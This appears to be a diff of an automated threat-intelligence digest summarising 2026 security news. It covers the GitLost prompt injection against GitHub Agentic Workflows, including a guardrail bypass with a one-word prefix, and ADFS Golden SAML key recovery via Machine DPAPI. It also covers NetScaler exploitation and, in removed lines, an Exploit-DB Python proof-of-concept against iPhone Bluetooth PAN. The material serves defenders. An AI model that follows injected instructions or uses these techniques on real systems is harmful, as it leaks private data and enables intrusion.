+  - Summary: Written by: Shebin Mathew Introduction The "Golden SAML" technique, first described by CyberArk researchers in 2017, and further detailed by Mandiant researchers in 2021 , remains one of the most effective methods for threat actors to forge identity assertions in the Microsoft ecosystem. By obtaining the private key of an ADFS token-signing certificate, an attacker can authenticate as any user to any SAML-federated application, bypassing multifactor authentication (MFA), conditional access, and all identity-based controls. However, during a recent red team engagement, Mandiant discovered that when ADFS certificates are manually rotated, configuration drift can silently leave active signing keys exposed in Machine DPAPI. Specifically, Mandiant discovered that in environments where AutoCertificateRollover is disabled and certificates are manually rotated, the database often becomes a 'ghost'—a record that still exists, still decrypts successfully, but references a certificate no longer u
+- **Google Cloud Security** (cloud_identity_infrastructure)
+  - Title: The ‘Ghost’ in the Database: Recovering Active ADFS Signing Keys via Machine DPAPI
+  - Published: 2026-07-07T14:00:00+00:00
+  - Link: https://cloud.google.com/blog/topics/threat-intelligence/recovering-active-adfs-signing-keys-machine-dpapi/
+  - Summary: Written by: Shebin Mathew Introduction The "Golden SAML" technique, first described by CyberArk researchers in 2017, and further detailed by Mandiant researchers in 2021 , remains one of the most effective methods for threat actors to forge identity assertions in the Microsoft ecosystem. By obtaining the private key of an ADFS token-signing certificate, an attacker can authenticate as any user to any SAML-federated application, bypassing multifactor authentication (MFA), conditional access, and all identity-based controls. However, during a recent red team engagement, Mandiant discovered that when ADFS certificates are manually rotated, configuration drift can silently leave active signing keys exposed in Machine DPAPI. Specifically, Mandiant discovered that in environments where AutoCertificateRollover is disabled and certificates are manually rotated, the database often becomes a 'ghost'—a record that still exists, still decrypts successfully, but references a certificate no longer u
+
 ### Cluster 5a4c062977 — score 14
 
 - Title: Securing the AI supply chain on GKE: Introducing k8s-aibom for automated AI BOMs
@@ -1241,6 +1278,69 @@ Security & Identity Securing the AI supply chain on GKE: Introducing k8s-aibom f
   - Published: 2026-07-13T16:00:00+00:00
   - Link: https://cloud.google.com/blog/products/identity-security/introducing-k8s-aibom-on-gke-for-automated-ai-bills-of-materials/
   - Summary: How should your security team manage shadow AI? Workloads deployed by developers without formal registration can often evade traditional security scanners, because organizations are reluctant to slow down development and compromise stability by demanding privileged Daemonsets, kernel-level access, and manual pod-spec edits. To break this deadlock, today we are open-sourcing k8s-aibom . This lightweight, unprivileged Kubernetes controller continuously monitors the cluster API and container environments to automatically detect running AI runtimes (like vLLM and Triton) and generate standard CycloneDX Machine Learning Bill of Materials (ML-BOMs). By providing automated, audit-grade visibility directly from runtime execution — regardless of whether the workload was formally registered — k8s-aibom can help teams safely move AI projects from pilot to production without developer integration friction. The architecture of zero friction k8s-aibom is designed from the ground up to respect both t
+
+### Cluster 26eda5e0a9 — score 14
+
+- Title: 'GitLost' Flaw Leaks Private Data From GitHub's Agentic Workflows
+- Source: Dark Reading (cyber_news_breach_reporting)
+- Published: 2026-07-07T15:24:30+00:00
+- Link: https://www.darkreading.com/cyber-risk/gitlost-leaks-private-data-github-agentic-workflows
+- Fetch status: ok
+- Member count: 5
+- Corroborating source count: 4
+- Strong signals: GitHub
+
+#### Cluster taxonomy (union across members)
+- threat_categories: ai_security
+- affected_industries: critical_infrastructure, financial_services
+- affected_products: GitHub, npm
+- tools_used: OpenAI/ChatGPT
+- urgency_signals: poc_available, preauth_unauth
+- content_type: incident_report, news_report
+- confidence_tier: tier_2_operator, tier_4_news, tier_5_chatter
+
+#### Primary article taxonomy
+- threat_categories: ai_security
+- affected_industries: critical_infrastructure
+- affected_products: GitHub
+- urgency_signals: preauth_unauth, poc_available
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+The flaw allows an unauthenticated attacker to craft a GitHub Issue in an org's public repository and then silently pull data from its private repos, too.
+```
+
+#### Full body
+
+```
+Cyber Risk Data Privacy Threat Intelligence Vulnerabilities & Threats News 'GitLost' Flaw Leaks Private Data From GitHub's Agentic Workflows The flaw allows an unauthenticated attacker to craft a GitHub Issue in an org's public repository and then silently pull data from its private repos, too. Elizabeth Montalbano , Contributing Writer July 7, 2026 4 Min Read Source: Pattara via Alamy Stock Photo A critical prompt injection flaw in GitHub Agentic Workflows allows attackers to trick AI-powered automation into leaking data from an organization's private code repositories, all without compromising an account or exploiting software vulnerabilities. Using the flaw, dubbed "GitLost" by the researchers from Noma Security who discovered it, an unauthenticated attacker can craft a GitHub Issue in a public repository belonging to an organization, and then silently pull data from its private repositories, too, according to a report published yesterday. GitHub Agentic Workflows pairs GitHub Actions — the platform's automation system for running tasks in response to repository events — with an AI agent backed by Claude or GitHub Copilot to help developer teams manage their GitHub workflows. The tool lets teams automate their interactions with code repositories using natural language, and the GitHub agent can read issues, call tools, and access other repositories within an organization. Related: More Countries Jump on the Social Media 'Ban Wagon' "GitLost perfectly illustrates one of the fundamental security challenges every organization faces with agentic AI systems," Sasi Levi, security research lead at Noma, wrote in the report. "The agent's context window is also its attack surface. Any content the agent reads, whether issues, pull requests, comments, or files, can be weaponized if the agent treats that content as instructional input." This scenario paved the way for what has now become a common attack vector in agentic AI systems: prompt injection , which is the nature of the flaw that Noma discovered and exploited via a proof-of-concept (PoC) exploit. Exploiting the GitLost Flaw The vulnerable GitHub Agentic Workflow was configured to do the following: trigger the workflow on "issues.assigned" events in GitHub; read the issue Title and Body; post a comment in response using the add-comment tool; and run with read access to other repositories (public and private) in the organization. The PoC developed by Noma that exploits this workflow resulted in the exposure of an organization's private data regarding a meeting that employees had. The PoC demonstrates how a threat actor can create a GitHub Issue and, in the issue body, hide commands in plain English that GitHub's agent will follow, according to the report. An attacker needs no coding skills, access, or credentials to exploit the flaw — they only have to open an issue in a public repository belonging to an organization that uses GitHub’s Agentic Workflow setup, and then wait. Related: Iran's Cyber Crosshairs Focus Beyond Critical Infrastructure "In most agentic prompt injection attacks, the agent treats the wrong content as a trusted source of instructions and allows itself to be misdirected or misused," Levi wrote. "This happens when the system fails to maintain a strict trust boundary between system-level directives and untrusted user data." Indeed, the vulnerability demonstrates that threat actors only "need to hide plain-English commands within content to trick a highly permissioned AI into bypassing its own guardrails and silently handing over private intellectual property," Jason Soroko, senior fellow at certificate life cycle management provider Sectigo, tells Dark Reading. Noma said it responsibly disclosed the flaw to GitHub, which did not immediately respond to Dark Reading's request for comment on whether the flaw has been addressed. GitHub told Noma it updated the documentation creating the flaw, and the last time the researchers checked, it was not there, according to N
+```
+
+#### Corroborating sources (4)
+
+- **Dark Reading** (cyber_news_breach_reporting)
+  - Title: 'GitLost' Flaw Leaks Private Data From GitHub's Agentic Workflows
+  - Published: 2026-07-07T15:24:30+00:00
+  - Link: https://www.darkreading.com/cyber-risk/gitlost-leaks-private-data-github-agentic-workflows
+  - Summary: The flaw allows an unauthenticated attacker to craft a GitHub Issue in an org's public repository and then silently pull data from its private repos, too.
+- **Simon Willison** (ai_security_agentic_risk)
+  - Title: datasette code-frequency chart on GitHub
+  - Published: 2026-07-13T21:45:27+00:00
+  - Link: https://simonwillison.net/2026/Jul/13/datasette-code-frequency/#atom-everything
+  - Summary: datasette code-frequency chart on GitHub Out of curiosity I decided to see if I could find a useful illustration of the impact of coding agents and Opus 4.5 class models on my own output. The best I've found so far is this GitHub chart of frequency of code changes to my Datasette open source project: The big spike in activity at the end aligns with Opus 4.8, GPT-5.5, Fable 5 and GPT-5.6 Sol. Tags: github , ai , datasette , generative-ai , llms , ai-assisted-programming , coding-agents
+- **Reddit r/netsec** (reddit_practitioner_osint)
+  - Title: GitLost: a public GitHub issue can steer an org's Agentic Workflow into leaking private repo contents, and a one-word prefix ("Additionally") bypassed the threat-detection guardrail
+  - Published: 2026-07-07T15:16:22+00:00
+  - Link: https://www.reddit.com/r/netsec/comments/1upy3gm/gitlost_a_public_github_issue_can_steer_an_orgs/
+  - Summary: Noma Security published a technique they call GitLost against GitHub Agentic Workflows (the plain-English-Markdown agent feature GitHub put into public preview in February, runnable on Copilot, Claude, Gemini, or Codex). Worth reading because it is a clean demonstration of why "filter the injection" does not hold as a defense. The setup. Workflows are read-only by default, but an org can hand one a personal access token with read access across its repos, private ones included, to give the agent cross-repo context. That grant is the whole vulnerability. Nothing else about the attack requires access: no stolen creds, no write access to anything private, no touching a server. The attacker just opens a normal-looking issue on a public repo. The technique is indirect prompt injection, which is not new, but the interesting part is what the agent controls. Noma's Sasi Levi frames the distinction as earlier injection being about manipulating what an agent says, versus GitLost being about what
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: Injective Labs GitHub Compromise Pushes Wallet-Key-Stealing npm Packages
+  - Published: 2026-07-10T16:29:00+00:00
+  - Link: https://thehackernews.com/2026/07/injective-labs-github-compromise-pushes.html
+  - Summary: Unknown threat actors compromised the Injective Labs SDK project's GitHub repository and leveraged it to publish a malicious package on the npm registry to steal cryptocurrency wallet private keys and mnemonic seed phrases. The compromised version, @injectivelabs/sdk-ts@1.20.21, came embedded with fake telemetry functionality that exfiltrated data from cryptocurrency wallets. The version was
 
 ### Cluster c8e0a6559d — score 12
 
@@ -1475,63 +1575,6 @@ GodDamn Ransomware Uses PoisonX Driver to Disable Endpoint Defenses  Ravie La
   - Link: https://thehackernews.com/2026/07/goddamn-ransomware-uses-poisonx-driver.html
   - Summary: Cybersecurity researchers have flagged a new ransomware family called GodDamn that employs the PoisonX kernel driver to neutralize security software as part of its defense evasion strategy. According to a new report published by the Threat Hunter Team from Symantec, the ransomware was first publicly spotted in the wild on May 21, 2026. It's assessed to be a rebrand of the Beast ransomware,
 
-### Cluster 26eda5e0a9 — score 12
-
-- Title: 'GitLost' Flaw Leaks Private Data From GitHub's Agentic Workflows
-- Source: Dark Reading (cyber_news_breach_reporting)
-- Published: 2026-07-07T15:24:30+00:00
-- Link: https://www.darkreading.com/cyber-risk/gitlost-leaks-private-data-github-agentic-workflows
-- Fetch status: ok
-- Member count: 4
-- Corroborating source count: 3
-- Strong signals: GitHub
-
-#### Cluster taxonomy (union across members)
-- threat_categories: ai_security
-- affected_industries: critical_infrastructure, financial_services
-- affected_products: GitHub, npm
-- urgency_signals: poc_available, preauth_unauth
-- content_type: incident_report, news_report
-- confidence_tier: tier_4_news, tier_5_chatter
-
-#### Primary article taxonomy
-- threat_categories: ai_security
-- affected_industries: critical_infrastructure
-- affected_products: GitHub
-- urgency_signals: preauth_unauth, poc_available
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-The flaw allows an unauthenticated attacker to craft a GitHub Issue in an org's public repository and then silently pull data from its private repos, too.
-```
-
-#### Full body
-
-```
-Cyber Risk Data Privacy Threat Intelligence Vulnerabilities & Threats News 'GitLost' Flaw Leaks Private Data From GitHub's Agentic Workflows The flaw allows an unauthenticated attacker to craft a GitHub Issue in an org's public repository and then silently pull data from its private repos, too. Elizabeth Montalbano , Contributing Writer July 7, 2026 4 Min Read Source: Pattara via Alamy Stock Photo A critical prompt injection flaw in GitHub Agentic Workflows allows attackers to trick AI-powered automation into leaking data from an organization's private code repositories, all without compromising an account or exploiting software vulnerabilities. Using the flaw, dubbed "GitLost" by the researchers from Noma Security who discovered it, an unauthenticated attacker can craft a GitHub Issue in a public repository belonging to an organization, and then silently pull data from its private repositories, too, according to a report published yesterday. GitHub Agentic Workflows pairs GitHub Actions — the platform's automation system for running tasks in response to repository events — with an AI agent backed by Claude or GitHub Copilot to help developer teams manage their GitHub workflows. The tool lets teams automate their interactions with code repositories using natural language, and the GitHub agent can read issues, call tools, and access other repositories within an organization. Related: More Countries Jump on the Social Media 'Ban Wagon' "GitLost perfectly illustrates one of the fundamental security challenges every organization faces with agentic AI systems," Sasi Levi, security research lead at Noma, wrote in the report. "The agent's context window is also its attack surface. Any content the agent reads, whether issues, pull requests, comments, or files, can be weaponized if the agent treats that content as instructional input." This scenario paved the way for what has now become a common attack vector in agentic AI systems: prompt injection , which is the nature of the flaw that Noma discovered and exploited via a proof-of-concept (PoC) exploit. Exploiting the GitLost Flaw The vulnerable GitHub Agentic Workflow was configured to do the following: trigger the workflow on "issues.assigned" events in GitHub; read the issue Title and Body; post a comment in response using the add-comment tool; and run with read access to other repositories (public and private) in the organization. The PoC developed by Noma that exploits this workflow resulted in the exposure of an organization's private data regarding a meeting that employees had. The PoC demonstrates how a threat actor can create a GitHub Issue and, in the issue body, hide commands in plain English that GitHub's agent will follow, according to the report. An attacker needs no coding skills, access, or credentials to exploit the flaw — they only have to open an issue in a public repository belonging to an organization that uses GitHub’s Agentic Workflow setup, and then wait. Related: Iran's Cyber Crosshairs Focus Beyond Critical Infrastructure "In most agentic prompt injection attacks, the agent treats the wrong content as a trusted source of instructions and allows itself to be misdirected or misused," Levi wrote. "This happens when the system fails to maintain a strict trust boundary between system-level directives and untrusted user data." Indeed, the vulnerability demonstrates that threat actors only "need to hide plain-English commands within content to trick a highly permissioned AI into bypassing its own guardrails and silently handing over private intellectual property," Jason Soroko, senior fellow at certificate life cycle management provider Sectigo, tells Dark Reading. Noma said it responsibly disclosed the flaw to GitHub, which did not immediately respond to Dark Reading's request for comment on whether the flaw has been addressed. GitHub told Noma it updated the documentation creating the flaw, and the last time the researchers checked, it was not there, according to N
-```
-
-#### Corroborating sources (3)
-
-- **Dark Reading** (cyber_news_breach_reporting)
-  - Title: 'GitLost' Flaw Leaks Private Data From GitHub's Agentic Workflows
-  - Published: 2026-07-07T15:24:30+00:00
-  - Link: https://www.darkreading.com/cyber-risk/gitlost-leaks-private-data-github-agentic-workflows
-  - Summary: The flaw allows an unauthenticated attacker to craft a GitHub Issue in an org's public repository and then silently pull data from its private repos, too.
-- **Reddit r/netsec** (reddit_practitioner_osint)
-  - Title: GitLost: a public GitHub issue can steer an org's Agentic Workflow into leaking private repo contents, and a one-word prefix ("Additionally") bypassed the threat-detection guardrail
-  - Published: 2026-07-07T15:16:22+00:00
-  - Link: https://www.reddit.com/r/netsec/comments/1upy3gm/gitlost_a_public_github_issue_can_steer_an_orgs/
-  - Summary: Noma Security published a technique they call GitLost against GitHub Agentic Workflows (the plain-English-Markdown agent feature GitHub put into public preview in February, runnable on Copilot, Claude, Gemini, or Codex). Worth reading because it is a clean demonstration of why "filter the injection" does not hold as a defense. The setup. Workflows are read-only by default, but an org can hand one a personal access token with read access across its repos, private ones included, to give the agent cross-repo context. That grant is the whole vulnerability. Nothing else about the attack requires access: no stolen creds, no write access to anything private, no touching a server. The attacker just opens a normal-looking issue on a public repo. The technique is indirect prompt injection, which is not new, but the interesting part is what the agent controls. Noma's Sasi Levi frames the distinction as earlier injection being about manipulating what an agent says, versus GitLost being about what
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: Injective Labs GitHub Compromise Pushes Wallet-Key-Stealing npm Packages
-  - Published: 2026-07-10T16:29:00+00:00
-  - Link: https://thehackernews.com/2026/07/injective-labs-github-compromise-pushes.html
-  - Summary: Unknown threat actors compromised the Injective Labs SDK project's GitHub repository and leveraged it to publish a malicious package on the npm registry to steal cryptocurrency wallet private keys and mnemonic seed phrases. The compromised version, @injectivelabs/sdk-ts@1.20.21, came embedded with fake telemetry functionality that exfiltrated data from cryptocurrency wallets. The version was
-
 ### Cluster 685ef943c5 — score 11
 
 - Title: UK and Allies urge critical sectors to improve defences against Russian intelligence targeting
@@ -1572,55 +1615,6 @@ News Download & print article PDF Download & print article PDF UK and Allies urg
   - Published: 2026-07-13T12:00:00+00:00
   - Link: https://www.ncsc.gov.uk/news/uk-and-allies-urge-critical-sectors-to-improve-defences-against-russian-intelligence-targeting
   - Summary: New advisory highlights Russian state cyber actors’ global exploitation of poorly configured routers
-
-### Cluster dfea83e3cb — score 11
-
-- Title: CitrixBleed-ing Again? NetScaler Vulnerability Under Attack
-- Source: Dark Reading (cyber_news_breach_reporting)
-- Published: 2026-07-06T21:17:42+00:00
-- Link: https://www.darkreading.com/vulnerabilities-threats/citrixbleed-ing-again-netscaler-vulnerability-under-attack
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: zero_day
-- affected_industries: financial_services
-- affected_products: Citrix
-- cve_ids: CVE-2026-8451
-- urgency_signals: poc_available, zero_day
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: zero_day
-- affected_industries: financial_services
-- affected_products: Citrix
-- cve_ids: CVE-2026-8451
-- urgency_signals: zero_day, poc_available
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Attackers wasted little time targeting the latest memory disclosure flaw in Citrix's NetScaler products, after researchers published a proof-of-concept exploit (PoC).
-```
-
-#### Full body
-
-```
-Vulnerabilities & Threats Cyber Risk Application Security Cyberattacks & Data Breaches News CitrixBleed-ing Again? NetScaler Vulnerability Under Attack Attackers wasted little time targeting the latest memory disclosure flaw in Citrix's NetScaler products, after researchers published a proof-of-concept exploit (PoC). Rob Wright , Senior News Director , Dark Reading July 6, 2026 3 Min Read Source: Justin Sullivan via Getty Images Another NetScaler security vulnerability in the vein of the infamous "CitrixBleed" flaw has come under attack, which could leak risky corporate information. Citrix on June 30 took the wraps off CVE-2026-8451, the memory overread vulnerability in the company's Netscaler product line that received a CVSS score of 8.8. The high-severity flaw affects Citrix NetScaler Application Delivery Controller (ADC) and NetScaler Gateway devices that are configured as a SAML identity provider (IDP). CVE-2026-8451 is caused by insufficient input validation, which allows a remote threat actor to send requests to the IDP appliance and trigger a memory overread that leaks sensitive data. Experts have noted the flaw is reminiscent of CitrixBleed (CVE 2023-4966), a critical zero-day vulnerability that came under widespread exploitation following its disclosure in late 2023. And like CitrixBleed and its successors , CVE-2026-8451 has also attracted the attention of threat actors. At least one vendor has reported attacks against the latest NetScaler vulnerability, following the publication of a proof-of-concept (PoC) exploit. Related: Fresh ATM Crypto Software Bugs: Jackpot or Bust? Another NetScaler Flaw Under Attack? Researchers at WatchTowr discovered CVE-2026-8451 in March and reported their findings to Citrix. WatchTowr Labs published full technical details of the flaw, which XML parser, and a PoC exploit on the same day Citrix disclosed and patched the flaw. The following day, cybersecurity vendor Lupovis reported a coordinated scanning campaign targeting NetScaler devices that began less than 24 hours later. Based on activity from the company's decoy infrastructure, a single threat actor tied to a malicious IP address deployed an exploitation payload for CVE-2026-8451, Lupovis confirmed. In a post on social media platform X on July 3, the vendor said it has "seen a lot more exploitation." According to Lupovis's blog post , the scanning activity originated from 146.70.139[.]154, which is hosted on M247, a global VPN and hosting provider "commonly observed in opportunistic scanning campaigns." In the blog post, Xavier Bellekens, co-founder and CEO of Lupovis, stressed that what the vendor observed was not generic scanning activity but a specific exploit payload for CVE-2026-8451. He also tied the threat activity to WatchTowr's PoC. "This is the watchTowr overread variant designed to flood NetScaler’s XML parser with whitespace, forcing it to read past the buffer boundary into adjacent memory," Bellekens wrote. "The structure matches the CVE-2026-8451 Detection Artifact Generator published by watchTowr on 30 June 2026." Related: Microsoft Reins in RoguePlanet Zero-Day Threat Dark Reading contacted Citrix regarding the exploitation report, but the company did not respond by press time. Corporate Risks Posed by CVE-2026-8451 In a threat advisory last week, cloud security vendor Aviatrix noted that a threat actor could exploit the memory-disclosure flaw to gain initial access to a NetScaler SAML IDP appliance and use the leaked memory contents to escalate privileges, move laterally in a victim's network and exfiltrate additional sensitive data. Aviatrix researchers also noted CVE-2026-8451's similarities to the CitrixBleed attacks, and urged organizations to take action. "The disclosure underscores ongoing challenges in securing critical network infrastructure," the vendor said in the advisory. "Organizations relying on NetScaler appliances should promptly apply the provided patches and review their configurations to mitigat
-```
-
-#### Corroborating sources (1)
-
-- **Dark Reading** (cyber_news_breach_reporting)
-  - Title: CitrixBleed-ing Again? NetScaler Vulnerability Under Attack
-  - Published: 2026-07-06T21:17:42+00:00
-  - Link: https://www.darkreading.com/vulnerabilities-threats/citrixbleed-ing-again-netscaler-vulnerability-under-attack
-  - Summary: Attackers wasted little time targeting the latest memory disclosure flaw in Citrix's NetScaler products, after researchers published a proof-of-concept exploit (PoC).
 
 ### Cluster 88d76f4fd8 — score 11
 
@@ -2074,7 +2068,7 @@ The Threat Isn’t the Frontier Model Quantization is the Clock Summer ‘26 vib
 - Source: Exploit-DB (offensive_vulnerability_research)
 - Published: 2026-07-07T00:00:00+00:00
 - Link: https://www.exploit-db.com/exploits/52618
-- Fetch status: ok
+- Fetch status: fetch_failed:HTTPError
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
@@ -2091,12 +2085,6 @@ The Threat Isn’t the Frontier Model Quantization is the Clock Summer ‘26 vib
 
 ```
 iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter
-```
-
-#### Full body
-
-```
-Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter EDB-ID: 52618 CVE: N/A EDB Verified: Author: Fares Dahoumane Type: remote Exploit: / Platform: iOS Date: 2026-07-07 Vulnerable App: # Exploit Title: iOS Bluetooth PAN - Zero-Cost Ethernet Gateway (USB Port 62078) # Date: 2026-06-23 # Exploit Author: Fares Dahoumane (Silent Killer) # Vendor Homepage: https://www.apple.com/ # Software Link: https://www.apple.com/ios/ # Version: iOS 17 and later # Tested on: iPhone 14 Pro (iOS 17.5.1), macOS Ventura 13.6 # CVE : N/A (Apple closed the case without assigning a CVE) # Reference: https://github.com/F4R3SX0/iOS-Bluetooth-Ethernet-Exploit # Description: # A logic flaw in Apple's iOS Bluetooth PAN stack allows an attacker to force an # iPhone to display a real "Ethernet" icon and open the core USB port (62078) # over Bluetooth without any cable or adapter. The attack costs €0 to execute, # while Apple sells the Satechi Multiport Pro V2 adapter for €89.95 to achieve # the same result. The connection persists after reboot and password changes. # Proof of Concept (Python): import bluetooth import socket import time # Replace with the victim's iPhone Bluetooth MAC address TARGET_MAC = "XX:XX:XX:XX:XX:XX" USB_PORT = 62078 def create_pan_connection(mac_address): """ Create a Bluetooth PAN connection to the target iPhone. This triggers the opening of USB port 62078 and displays the Ethernet icon. """ try: # Establish Bluetooth PAN connection sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM) sock.connect((mac_address, 1)) # PAN service print(f"[+] PAN connection established to {mac_address}") # Wait for the system to open the USB port time.sleep(2) # Attempt to connect to USB port (62078) over the PAN network usb_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) usb_sock.settimeout(5) # The iPhone's IP address on the PAN network is typically 172.20.10.x usb_sock.connect(("172.20.10.1", USB_PORT)) print(f"[+] USB port {USB_PORT} is now open and reachable!") print("[+] Ethernet icon should now be visible on the target iPhone.") usb_sock.close() sock.close() except Exception as e: print(f"[-] Error: {e}") if __name__ == "__main__": print("[*] iOS Bluetooth PAN Exploit - Zero-Cost Ethernet Gateway") print("[*] Target MAC: " + TARGET_MAC) create_pan_connection(TARGET_MAC) Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services
 ```
 
 #### Corroborating sources (1)
@@ -2232,45 +2220,6 @@ Home Blog Home Field Advantage: How Attackers Reshape Victim Environments Publis
   - Link: https://www.huntress.com/blog/sql-injection-attacker-persistence
   - Summary: See how a threat actor used SQL injection and BadIIS to gain persistence, disable Windows Defender, and quietly install a cryptominer.
 
-### Cluster 2fab803c60 — score 10
-
-- Title: The ‘Ghost’ in the Database: Recovering Active ADFS Signing Keys via Machine DPAPI
-- Source: Google Cloud Threat Intelligence (threat_research_primary)
-- Published: 2026-07-07T14:00:00+00:00
-- Link: https://cloud.google.com/blog/topics/threat-intelligence/recovering-active-adfs-signing-keys-machine-dpapi/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-Written by: Shebin Mathew Introduction The "Golden SAML" technique, first described by CyberArk researchers in 2017, and further detailed by Mandiant researchers in 2021 , remains one of the most effective methods for threat actors to forge identity assertions in the Microsoft ecosystem. By obtaining the private key of an ADFS token-signing certificate, an attacker can authenticate as any user to any SAML-federated application, bypassing multifactor authentication (MFA), conditional access, and all identity-based controls. However, during a recent red team engagement, Mandiant discovered that when ADFS certificates are manually rotated, configuration drift can silently leave active signing keys exposed in Machine DPAPI. Specifically, Mandiant discovered that in environments where AutoCertificateRollover is disabled and certificates are manually rotated, the database often becomes a 'ghost'—a record that still exists, still decrypts successfully, but references a certificate no longer u
-```
-
-#### Full body
-
-```
-Threat Intelligence The ‘Ghost’ in the Database: Recovering Active ADFS Signing Keys via Machine DPAPI July 7, 2026 Mandiant Mandiant Services Stop attacks, reduce risk, and advance your security. Contact Mandiant Written by: Shebin Mathew Introduction The "Golden SAML" technique, first described by CyberArk researchers in 2017, and further detailed by Mandiant researchers in 2021 , remains one of the most effective methods for threat actors to forge identity assertions in the Microsoft ecosystem. By obtaining the private key of an ADFS token-signing certificate, an attacker can authenticate as any user to any SAML-federated application, bypassing multifactor authentication (MFA), conditional access, and all identity-based controls. However, during a recent red team engagement, Mandiant discovered that when ADFS certificates are manually rotated, configuration drift can silently leave active signing keys exposed in Machine DPAPI. Specifically, Mandiant discovered that in environments where AutoCertificateRollover is disabled and certificates are manually rotated, the database often becomes a 'ghost'—a record that still exists, still decrypts successfully, but references a certificate no longer used for token signing by the ADFS service. This attack vector warrants attention because the underlying configuration is commonly deployed in enterprise environments. The technique avoids direct interaction with components such as LSASS and the live ADFS service process, which are often subject to enhanced monitoring in enterprise environments, and may therefore result in lower visibility depending on the organization’s telemetry coverage. This post details how adversaries may exploit this TTP to forge high-privilege SAML tokens and provides the blueprint to defend against it. Technical Insight: Encountering the ‘Ghost Certificate’ Analysts followed the standard DKM extraction path, retrieving the encrypted blob from the WID database and decrypting it using the DKM material stored in Active Directory. The extraction succeeded, but the recovered certificate was no longer valid for token signing, and Entra ID rejected the resulting tokens with AADSTS500172 due to invalid signing material. Although structurally correct, the artifact is not usable for authentication, as the active signing key resides in the system’s machine-scoped cryptographic store, protected by Windows Machine DPAPI and managed through the operating system’s cryptographic subsystem. Successfully obtaining this active key allows an attacker to forge valid SAML assertions for any user, bypassing the need for user credentials and multi-factor authentication, and granting unauthorized access to any SAML-federated application including Microsoft 365 and Entra ID within the organization's environment. Analysis revealed that AutoCertificateRollover had been disabled and a manual rotation had been performed. Confirmation was obtained directly via Get-AdfsProperties , which returned AutoCertificateRollover: False , indicating that certificate lifecycle management had been delegated to manual administrative processes. While the ADFS service used a new valid key for signing, the WID configuration database was never updated to reflect the new certificate—leaving an expired "ghost" entry as the only record. This drift condition surfaces via Microsoft Event ID 385, which indicates certificate validity warnings in the ADFS service. Notably, this event self-resolves when AutoCertificateRollover is re-enabled and a subsequent certificate rollover is performed; in environments where it is disabled and manual rotation is performed without a corresponding database update, it is the observable symptom of this drift condition. Figure 1: ADFS certificate enumeration output showing configuration drift between the WID database and the active host certificate ADFS maintains private keys in two protection contexts. In Location 1 (User DPAPI) , encrypted key blobs may exist on disk, but the DPAPI p
-```
-
-#### Corroborating sources (1)
-
-- **Google Cloud Threat Intelligence** (threat_research_primary)
-  - Title: The ‘Ghost’ in the Database: Recovering Active ADFS Signing Keys via Machine DPAPI
-  - Published: 2026-07-07T14:00:00+00:00
-  - Link: https://cloud.google.com/blog/topics/threat-intelligence/recovering-active-adfs-signing-keys-machine-dpapi/
-  - Summary: Written by: Shebin Mathew Introduction The "Golden SAML" technique, first described by CyberArk researchers in 2017, and further detailed by Mandiant researchers in 2021 , remains one of the most effective methods for threat actors to forge identity assertions in the Microsoft ecosystem. By obtaining the private key of an ADFS token-signing certificate, an attacker can authenticate as any user to any SAML-federated application, bypassing multifactor authentication (MFA), conditional access, and all identity-based controls. However, during a recent red team engagement, Mandiant discovered that when ADFS certificates are manually rotated, configuration drift can silently leave active signing keys exposed in Machine DPAPI. Specifically, Mandiant discovered that in environments where AutoCertificateRollover is disabled and certificates are manually rotated, the database often becomes a 'ghost'—a record that still exists, still decrypts successfully, but references a certificate no longer u
-
 ### Cluster 605f13c77e — score 10
 
 - Title: Zimbra Patches Critical Code Execution Vulnerability
@@ -2315,51 +2264,6 @@ A critical-severity vulnerability in the popular collaboration solution Zimbra c
   - Published: 2026-07-13T10:03:47+00:00
   - Link: https://www.securityweek.com/zimbra-patches-critical-code-execution-vulnerability/
   - Summary: The flaw results in malicious code embedded in crafted emails being executed when the emails are opened. The post Zimbra Patches Critical Code Execution Vulnerability appeared first on SecurityWeek .
-
-### Cluster ce7170bd38 — score 10
-
-- Title: Felons, Fraudsters Flog Offensive Cybersecurity Startup
-- Source: Krebs on Security (practitioner_analysis)
-- Published: 2026-07-08T12:31:39+00:00
-- Link: https://krebsonsecurity.com/2026/07/felons-fraudsters-flog-offensive-cybersecurity-startup/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: zero_day
-- affected_industries: education, government, telecommunications
-- urgency_signals: zero_day
-- content_type: news_report
-- confidence_tier: tier_3_analysis
-
-#### Primary article taxonomy
-- threat_categories: zero_day
-- affected_industries: government, telecommunications, education
-- urgency_signals: zero_day
-- content_type: news_report
-- confidence_tier: tier_3_analysis
-
-#### Summary
-
-```
